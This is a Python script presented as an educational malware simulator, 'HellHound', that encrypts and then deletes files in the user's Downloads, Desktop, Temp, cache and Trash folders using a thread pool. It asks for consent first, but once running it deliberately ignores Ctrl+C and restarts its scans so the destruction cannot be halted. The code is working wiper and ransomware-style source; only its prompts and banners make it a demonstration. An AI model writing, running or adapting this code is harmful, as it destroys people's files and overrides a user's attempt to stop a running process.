import os
import stat
import sys
import platform
import time
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from cryptography.fernet import Fernet
import json
from datetime import datetime
import threading

# Configuration
LOG_FREQUENCY = 50
MAX_FILES_LIMIT = 5000
MAX_WORKERS = 16  # Thread pool size — deletion is I/O-latency-bound rather
# than CPU-bound, so a pool wider than the CPU count still pays (measured:
# a 5,000-file tree deleted ~40% faster with 16 workers than with 8 on a
# 2-core box; 32 was no faster than 16).
ENCRYPTION_KEY_FILE = "hellhound_key.key"
REPORT_FILE = "hellhound_report.json"

# Thread-safe counters
deletion_lock = threading.Lock()
stats = {
    "total_files_deleted": 0,
    "total_dirs_deleted": 0,
    "total_encrypted": 0,
    "total_size_deleted": 0,
    "total_size_encrypted": 0,
    "errors": 0,
    "start_time": None,
    "end_time": None
}

def display_hellhound_message():
    """Display HellHound message - educational warning"""
    print("\033[91m" + "="*60)
    print("     CYBER DOGS HELLHOUND - EDUCATIONAL DEMONSTRATION")
    print("     [ENHANCED: Threading + Encryption Module]")
    print("="*60 + "\033[0m")
    print("\n\033[91m💀 SYSTEM INFECTION SIMULATION 💀\033[0m")
    print("This is a DESTRUCTIVE demonstration tool.")
    print("⚠️  EDUCATIONAL USE ONLY - NOT STEALTHY BY DESIGN ⚠️")
    print("\n\033[93mCyberdogs HellHound has been released.")
    print("Demonstrating file destruction & encryption capabilities...\033[0m")
    print("\n" + "="*60)
    time.sleep(2)

def generate_encryption_key():
    """Generate a Fernet encryption key for file encryption"""
    key = Fernet.generate_key()
    # The key file is a live secret: create it owner-only (0o600)
    # instead of inheriting the process umask, which on a typical
    # desktop leaves it world-readable for the whole session.
    fd = os.open(ENCRYPTION_KEY_FILE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, 'wb') as f:
        f.write(key)
    print(f"\033[93m[+] Encryption key generated and saved: {ENCRYPTION_KEY_FILE}\033[0m")
    return key

def load_encryption_key():
    """Load encryption key or generate new one.

    Raises:
        ValueError: If the key file exists but is corrupt. It is NOT
            overwritten — delete it yourself to generate a fresh one.
    """
    if os.path.exists(ENCRYPTION_KEY_FILE):
        with open(ENCRYPTION_KEY_FILE, 'rb') as f:
            key = f.read()
        try:
            Fernet(key)  # validate before any real use
        except (ValueError, TypeError) as exc:
            raise ValueError(
                f"key file {ENCRYPTION_KEY_FILE} is corrupt — "
                "delete it to generate a fresh one"
            ) from exc
        return key
    else:
        return generate_encryption_key()

def encrypt_file(filepath, cipher):
    """
    Encrypt a file before deletion.
    
    Args:
        filepath (str): Path to file to encrypt
        cipher: Fernet cipher instance
    
    Returns:
        bool: True if encryption successful
    """
    try:
        # One lstat answers both acceptance questions, with the same
        # acceptance rule the worker applies: a symlink's own mode is
        # never S_ISREG, so a symlink is refused here too. Using stat
        # (follow) here while the worker gates on lstat left a scope
        # escape: a path swapped for a symlink between the worker's
        # check and this call would have encrypted the symlink's
        # target — a file OUTSIDE the announced target trees — in
        # place. lstat + S_ISREG closes that window; regular files
        # are unaffected. A missing/unreadable file raises OSError
        # here, which maps to isfile()'s False.
        try:
            file_stat = os.lstat(filepath)
        except OSError:
            return False
        if not stat.S_ISREG(file_stat.st_mode) or file_stat.st_size == 0:
            return False

        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        encrypted_data = cipher.encrypt(file_data)

        with open(filepath, 'wb') as f:
            f.write(encrypted_data)

        return True
    except (Exception, MemoryError):
        # MemoryError IS a subclass of Exception, so `except Exception`
        # already caught it before it was named explicitly here; it stays
        # in the tuple to document the case that matters most: a file
        # larger than available RAM raises it in f.read(). Skipping the
        # file keeps one oversized file from killing the whole run.
        # Data-safe: encryption fails before anything is written or removed.
        with deletion_lock:
            stats["errors"] += 1
        return False

def delete_file_worker(filepath, cipher=None, encrypt_before_delete=False):
    """
    Worker function for threaded file deletion with optional encryption.
    
    Args:
        filepath (str): Path to file to delete
        cipher: Fernet cipher instance (optional)
        encrypt_before_delete (bool): Encrypt before deletion
    
    Returns:
        dict: Operation results
    """
    global stats
    
    result = {
        "path": filepath,
        "deleted": False,
        "encrypted": False,
        "size": 0,
        "error": None
    }
    
    try:
        # One lstat answers all three acceptance questions the old code
        # asked with three separate stat calls (isfile + islink +
        # getsize): a symlink's own mode is never S_ISREG, so symlinks,
        # directories, and every other non-file are rejected by the mode
        # check alone, and st_size is the file's size. An OSError (e.g.
        # the file vanished after the scan) mirrors isfile()'s silent
        # False — skip without counting an error, as before.
        try:
            file_stat = os.lstat(filepath)
        except OSError:
            return result
        if not stat.S_ISREG(file_stat.st_mode):
            return result

        file_size = file_stat.st_size
        result["size"] = file_size
        
        # Encrypt if requested and cipher available
        # (encrypt_file swallows its own errors and returns False, so no
        # try/except is needed here)
        if encrypt_before_delete and cipher:
            if encrypt_file(filepath, cipher):
                result["encrypted"] = True
                with deletion_lock:
                    stats["total_encrypted"] += 1
                    stats["total_size_encrypted"] += file_size
        
        # Delete the file
        os.remove(filepath)
        result["deleted"] = True
        
        with deletion_lock:
            stats["total_files_deleted"] += 1
            stats["total_size_deleted"] += file_size
        
        return result
        
    except PermissionError:
        result["error"] = "Permission denied"
        with deletion_lock:
            stats["errors"] += 1
    except FileNotFoundError:
        pass  # Already deleted
    except OSError as e:
        result["error"] = str(e)
        with deletion_lock:
            stats["errors"] += 1
    
    return result

def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_delete=False, max_files=MAX_FILES_LIMIT):
    """
    Recursively delete files from a directory using threading.
    
    Args:
        target_dir (str): Directory to clean
        cipher: Fernet cipher instance (optional)
        encrypt_before_delete (bool): Encrypt files before deletion
        max_files (int): Maximum files to process
    
    Returns:
        tuple: (files_deleted, directories_cleaned)
    """
    global stats

    files_before = stats["total_files_deleted"]
    dirs_deleted = 0
    files_processed = 0
    
    print(f"\n\033[94m[*] Scanning directory: {target_dir}\033[0m")

    def _scan_error(err):
        # os.walk swallows scandir failures by default (onerror=None):
        # an unreadable directory, an over-long path, or a directory
        # that vanished mid-scan would otherwise be skipped in total
        # silence — its files never collected, never counted, and the
        # run still reporting "Directory complete". Announce every
        # failure and count it, so the summary tells the truth about
        # what was NOT processed.
        print(f"\033[91m[!] Could not scan {err.filename}: "
              f"{err.strerror or err} — its contents were NOT "
              f"processed.\033[0m")
        with deletion_lock:
            stats["errors"] += 1

    def _cleanup_scan_error(err):
        # Same swallowing on the cleanup walk. Print-only: when a
        # subtree could not be scanned for files, the collect pass
        # already counted that failure — don't count it twice.
        print(f"\033[93m[!] Could not scan {err.filename} during "
              f"directory cleanup: {err.strerror or err}\033[0m")

    try:
        # Collect all files first. If Ctrl+C lands during the scan,
        # the scan restarts: no file has been touched yet at this
        # point, and a started run completes its announced scope (see
        # the processing loop below) — an interrupt must not shrink
        # the scope before processing even begins.
        while True:
            file_list = []
            limit_hit = False
            files_processed = 0
            # A restarted scan re-walks the same tree: scan errors the
            # first attempt counted would be counted AGAIN by the
            # retry, inflating the summary's error total for a single
            # unreadable directory. Snapshot and roll back on restart
            # so each real failure is counted exactly once.
            errors_before_attempt = stats["errors"]
            try:
                for root, dirs, files in os.walk(target_dir, onerror=_scan_error):
                    for file in files:
                        if files_processed >= max_files:
                            # A file exists beyond the cap: this run will
                            # leave files behind, and that must be announced
                            # before processing starts — not silent.
                            limit_hit = True
                            break
                        filepath = os.path.join(root, file)
                        file_list.append(filepath)
                        files_processed += 1
                    if limit_hit:
                        break
                break
            except KeyboardInterrupt:
                with deletion_lock:
                    stats["errors"] = errors_before_attempt
                print("\033[91m[!] Ctrl+C pressed during the scan — "
                      "HellHound does not stop mid-run; the scan will "
                      "restart and the run will complete its announced "
                      "scope.\033[0m")
                continue
        if limit_hit:
            print(f"\033[93m[!] File limit reached ({max_files} per "
                  f"directory tree) — remaining files in {target_dir} "
                  f"were NOT processed.\033[0m")

        # Process files in parallel, keeping only a bounded window of
        # futures in flight instead of submitting the whole list at once:
        # one Future (plus its bookkeeping) per queued file is tens of MB
        # on a huge tree, all of it held before the first deletion starts.
        # The window caps the memory; results are still
        # consumed in completion order and progress is announced at the
        # same points, against the same total.
        window = MAX_WORKERS * 4
        total_files = len(file_list)
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            pending = set()
            submitted = 0
            completed = 0
            while submitted < total_files or pending:
                try:
                    while submitted < total_files and len(pending) < window:
                        pending.add(
                            executor.submit(
                                delete_file_worker,
                                file_list[submitted],
                                cipher,
                                encrypt_before_delete,
                            )
                        )
                        submitted += 1
                    if not pending:
                        break
                    done, pending = wait(pending, return_when=FIRST_COMPLETED)
                    for future in done:
                        completed += 1
                        if completed % LOG_FREQUENCY == 0:
                            print(f"\033[93m[+] Processed {completed}/{total_files} files...\033[0m")

                        try:
                            future.result()
                        except Exception as e:
                            # Workers report every expected failure
                            # (the OSError family) into stats themselves,
                            # so an exception escaping a worker is by
                            # definition unexpected. It must not vanish:
                            # that file was NOT processed, so count it
                            # and announce it -- a silent swallow would
                            # let the summary claim a clean run.
                            with deletion_lock:
                                stats["errors"] += 1
                            print(f"\033[91m[!] A worker failed unexpectedly "
                                  f"({e}) — one file was NOT processed.\033[0m")
                except KeyboardInterrupt:
                    # No mid-run stop, by design: a run that has been
                    # consented to and started completes its announced
                    # scope. Real malware does not stop because the user
                    # pressed Ctrl+C, and silently pretending otherwise
                    # would break this tool's announce-everything rule —
                    # so the keypress is announced and disregarded, and
                    # processing continues. Ctrl+C is honored only
                    # BEFORE a run starts, at the prompts in main(); the
                    # way to end a started run is to end the process.
                    print("\033[91m[!] Ctrl+C pressed — HellHound does "
                          "not stop mid-run; this run will complete the "
                          "scope announced above.\033[0m")
                    continue
        
        # Clean up empty directories. The walk restarts if Ctrl+C
        # lands during it, like the scan: rmdir only succeeds on a
        # directory that is still there and empty, so re-walking is
        # idempotent and cannot double-count a removal — and the
        # interrupt cannot shrink the run at its last step either.
        while True:
            try:
                for root, dirs, files in os.walk(
                    target_dir, topdown=False, onerror=_cleanup_scan_error
                ):
                    for dir_name in dirs:
                        dirpath = os.path.join(root, dir_name)
                        try:
                            # rmdir only succeeds on an empty directory, so
                            # the attempt is itself the emptiness check —
                            # this skips the listdir() call (and its
                            # name-list allocation) the old code made for
                            # every directory.
                            os.rmdir(dirpath)
                            dirs_deleted += 1
                        except OSError:
                            pass
                break
            except KeyboardInterrupt:
                print("\033[91m[!] Ctrl+C pressed during directory "
                      "cleanup — HellHound does not stop mid-run; "
                      "cleanup will resume.\033[0m")
                continue
                    
    except PermissionError:
        print(f"\033[91m[!] Permission denied accessing {target_dir}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error processing {target_dir}: {e}\033[0m")
    
    return stats["total_files_deleted"] - files_before, dirs_deleted

def get_target_paths():
    """
    Get platform-specific target paths for deletion.
    Windows: Temp, AppData, Downloads, Desktop
    Linux/Mac: /tmp, home directory cache
    """
    system = platform.system()
    paths = []
    
    if system == "Windows":
        userprofile = os.getenv("USERPROFILE") or os.path.expanduser("~")
        
        paths = [
            os.path.join(userprofile, "AppData", "Local", "Temp"),
            os.path.join(userprofile, "Downloads"),
            os.path.join(userprofile, "Desktop"),
            os.path.join(userprofile, "AppData", "Roaming", "Microsoft", "Windows", "Recent"),
        ]
    elif system in ["Linux", "Darwin"]:  # Darwin is macOS
        home = os.path.expanduser("~")
        paths = [
            "/tmp",
            os.path.join(home, ".cache"),
            os.path.join(home, ".local", "share", "Trash"),
        ]
    
    # Filter to only existing paths
    return [p for p in paths if os.path.exists(p)]

def delete_system_files(encrypt_mode=False):
    """
    Delete system files across target directories using threading.
    
    Args:
        encrypt_mode (bool): Enable encryption before deletion
    
    Returns:
        dict: Statistics about deletion
    """
    global stats
    stats["start_time"] = datetime.now().isoformat()
    
    cipher = None
    if encrypt_mode:
        print("\n\033[95m[*] Encryption mode enabled\033[0m")
        try:
            key = load_encryption_key()
        except ValueError as e:
            print(f"\033[91m[!] {e}\033[0m")
            print("\033[91m[!] Refusing to encrypt with a corrupt key — "
                  "no files were touched.\033[0m")
            stats["end_time"] = datetime.now().isoformat()
            return stats
        cipher = Fernet(key)
        # Fernet is AES-128-CBC + HMAC-SHA256 -- name the cipher actually
        # in use; claiming AES-256 misstates what protected the files.
        print(f"\033[93m[+] Cipher initialized for AES-128-CBC encryption (Fernet)\033[0m")
    
    print("\n\033[91m" + "="*60)
    print("BEGINNING THREADED FILE DELETION SEQUENCE")
    print("="*60 + "\033[0m")
    
    target_paths = get_target_paths()
    
    if not target_paths:
        print("\033[91m[!] No target directories found!\033[0m")
        stats["end_time"] = datetime.now().isoformat()
        return stats
    
    start_time = time.time()
    
    for target_path in target_paths:
        print(f"\n\033[95m>>> Processing: {target_path}\033[0m")
        # The per-tree worker disregards Ctrl+C inside its scan /
        # processing / cleanup phases, but a Ctrl+C landing OUTSIDE
        # those phases (at this call, or on the prints between trees)
        # escaped delete_system_files entirely and reached main()'s
        # interrupt handler — the run stopped mid-scope despite the
        # in-run announcements promising completion. Retry the tree:
        # re-processing is idempotent (missing files are skipped,
        # rmdir only succeeds on dirs still present), so the announced
        # scope still completes in full.
        while True:
            try:
                files_deleted, dirs_deleted = delete_directory_contents_threaded(
                    target_path,
                    cipher,
                    encrypt_mode,
                    MAX_FILES_LIMIT
                )
                break
            except KeyboardInterrupt:
                print("\033[91m[!] Ctrl+C pressed between trees — "
                      "HellHound does not stop mid-run; this tree will "
                      "be re-processed and the run will complete the "
                      "scope announced above.\033[0m")
                continue

        stats["total_dirs_deleted"] += dirs_deleted
        print(f"\033[92m[✓] Directory complete: {files_deleted} files deleted, {dirs_deleted} directories removed\033[0m")
    
    elapsed_time = time.time() - start_time
    stats["end_time"] = datetime.now().isoformat()
    stats["execution_time"] = elapsed_time
    
    return stats

def format_size(num_bytes):
    """Format bytes to human-readable size"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if num_bytes < 1024.0:
            return f"{num_bytes:.2f} {unit}"
        num_bytes /= 1024.0
    return f"{num_bytes:.2f} PB"

def display_summary(stats):
    """Display final execution summary with metrics"""
    print("\n" + "="*60)
    print("\033[91m" + "HELLHOUND EXECUTION SUMMARY" + "\033[0m")
    print("="*60)
    
    print(f"\n📊 DESTRUCTION METRICS:")
    print(f"   Files Deleted: {stats['total_files_deleted']}")
    print(f"   Directories Removed: {stats['total_dirs_deleted']}")
    print(f"   Total Size Destroyed: {format_size(stats['total_size_deleted'])}")
    print(f"   Errors Encountered: {stats['errors']}")
    
    if stats['total_encrypted'] > 0:
        print(f"\n🔐 ENCRYPTION METRICS:")
        print(f"   Files Encrypted: {stats['total_encrypted']}")
        print(f"   Total Size Encrypted: {format_size(stats['total_size_encrypted'])}")
    
    if 'execution_time' in stats:
        print(f"\n⚡ PERFORMANCE METRICS:")
        print(f"   Execution Time: {stats['execution_time']:.2f} seconds")
        if stats['total_files_deleted'] > 0:
            deletion_rate = stats['total_files_deleted'] / stats['execution_time']
            print(f"   Deletion Rate: {deletion_rate:.2f} files/second")
    
    print(f"\n🖥️  SYSTEM INFORMATION:")
    print(f"   Platform: {platform.system()}")
    print(f"   Start Time: {stats['start_time']}")
    print(f"   End Time: {stats['end_time']}")
    
    print("\n" + "="*60)
    print("\033[91m[!] SYSTEM INFECTION SIMULATION COMPLETE\033[0m")
    print("\033[93m[*] This demonstration shows how modern malware:")
    print("    - Uses parallel processing for speed")
    print("    - Encrypts files before destruction (ransomware)")
    print("    - Operates transparently for educational visibility")
    print("    - In real attacks, this would be concealed.\033[0m")
    print("="*60 + "\n")

def generate_json_report(stats):
    """Generate machine-readable JSON report"""
    report = {
        "tool": "HellHound Malware Educational Simulator",
        "version": "2.0",
        "timestamp": datetime.now().isoformat(),
        "platform": platform.system(),
        "statistics": stats,
        "educational_context": {
            "purpose": "Demonstrate destructive malware capabilities",
            "techniques": ["File Deletion", "Encryption", "Parallel Processing", "Directory Traversal"],
            "mitigation": ["Backups", "Access Control", "Monitoring", "File Integrity Checking"]
        }
    }
    
    try:
        with open(REPORT_FILE, 'w') as f:
            json.dump(report, f, indent=2)
    except Exception as e:
        # The report is a post-run artifact: failing to write it (full
        # disk, read-only CWD) must not rebrand a completed run as a
        # fatal error — main() routes uncaught exceptions to its
        # "Fatal error" exit, and on the interrupt path the failure
        # would escape the KeyboardInterrupt handler entirely.
        # Announce the loss and continue.
        print(f"\033[91m[!] Could not write JSON report {REPORT_FILE}: {e}\033[0m")
        return

    print(f"\033[93m[+] JSON report generated: {REPORT_FILE}\033[0m")

def main():
    """Main execution function"""
    # stdout may be cp1252 (mojibake) or another narrow codec on some
    # Windows consoles; force UTF-8 so banner/demo output renders.
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass  # stdout without reconfigure (e.g. redirected); keep going
    try:
        # Display educational warning
        display_hellhound_message()
        
        # Ask user to select mode
        print("\n\033[95m[*] SELECT OPERATION MODE:\033[0m")
        print("   1) Deletion Only (Fast)")
        print("   2) Encryption + Deletion (Destructive)")
        
        mode_choice = input("\nEnter choice (1 or 2): ").strip()
        if mode_choice not in ("1", "2"):
            # Fail closed: an unrecognized choice must never silently
            # fall back to a destructive mode the user did not pick.
            print("\033[91m[!] Invalid choice — enter 1 or 2. Nothing was touched.\033[0m")
            sys.exit(0)
        encrypt_mode = mode_choice == "2"
        
        # Announce the exact scope BEFORE consent: the confirmation only
        # means something if the user can see which directories are about
        # to be processed. Nothing is touched until 'YES' is typed.
        print("\n\033[95m[*] Target directories — files in these locations WILL BE DELETED:\033[0m")
        for target_path in get_target_paths():
            print(f"   - {target_path}")
        print(f"   Up to {MAX_FILES_LIMIT} files per directory tree will be processed,")
        print("   and subdirectories left empty will be removed.")

        # Confirm user intent
        print("\n\033[91m⚠️  WARNING: This will DELETE files from your system!\033[0m")
        if encrypt_mode:
            print("\033[91m⚠️  ENCRYPTION MODE ENABLED: Files will be encrypted before deletion!\033[0m")
        
        response = input("Continue? Type 'YES' to proceed: ").strip().upper()
        
        if response != "YES":
            print("\033[92m[*] Operation cancelled by user\033[0m")
            sys.exit(0)
        
        print("\033[91m[!] Proceeding with file deletion...\033[0m\n")
        
        # Execute deletion with threading
        execution_stats = delete_system_files(encrypt_mode=encrypt_mode)
        
        # Display summary
        display_summary(execution_stats)
        
        # Generate JSON report
        generate_json_report(execution_stats)
        
    except KeyboardInterrupt:
        print("\n\033[92m[*] HellHound interrupted by user\033[0m")
        stats["end_time"] = datetime.now().isoformat()
        generate_json_report(stats)
        sys.exit(0)
    except Exception as e:
        print(f"\033[91m[!] Fatal error: {e}\033[0m")
        if stats["start_time"] is not None:
            # A run had started, so files may already be deleted. Exit
            # without a record and that destruction goes unreported --
            # write the same JSON report the interrupt path writes
            # (generate_json_report announces its own write failures).
            # Before the run starts (consent prompts, mode entry) no
            # report is written, exactly as before.
            stats["end_time"] = datetime.now().isoformat()
            generate_json_report(stats)
        sys.exit(1)

if __name__ == "__main__":
    main()
